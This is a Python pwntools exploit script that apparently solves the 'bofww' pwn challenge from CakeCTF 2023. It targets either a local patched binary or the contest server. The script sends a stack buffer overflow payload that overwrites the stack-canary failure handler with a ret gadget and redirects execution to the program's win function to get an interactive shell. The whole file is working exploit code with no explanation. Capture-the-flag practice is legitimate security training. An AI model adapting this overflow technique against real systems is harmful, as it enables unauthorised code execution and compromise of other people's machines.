#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("bofww_patched")

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)

host, port = "bofww.2023.cakectf.com", "9002"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

ret = 0x000000000040101a
# overwrite __stack_chk_fail with ret gadget and jump to win function
payload = p64(ret)
payload = payload.ljust(0x110, b'\x00')+p64(0xdeadbeef)+p64(ret)+p64(exe.sym['_Z3winv'])+p64(ret)
payload += p64(0x404050)+p64(0x100)
sla('name? ', payload)
sla('you? ', str(0))
#gotshell

p.interactive()

